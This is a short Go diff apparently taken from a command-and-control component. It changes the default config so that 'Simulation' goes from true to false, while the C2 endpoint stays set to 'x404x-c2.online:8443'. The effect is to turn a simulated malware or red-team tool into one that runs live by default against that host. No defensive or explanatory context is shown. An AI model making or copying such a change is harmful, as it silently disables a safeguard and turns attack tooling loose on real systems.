@@ -30,4 +30,4 @@ type V29Config struct {
 	C2Endpoint          string `json:"c2_endpoint"`
 }
 
-func DefaultV29Config() *V29Config { return &V29Config{Enabled: true, Simulation: true, C2Endpoint: "x404x-c2.online:8443"} }
+func DefaultV29Config() *V29Config { return &V29Config{Enabled: true, Simulation: false, C2Endpoint: "x404x-c2.online:8443"} }
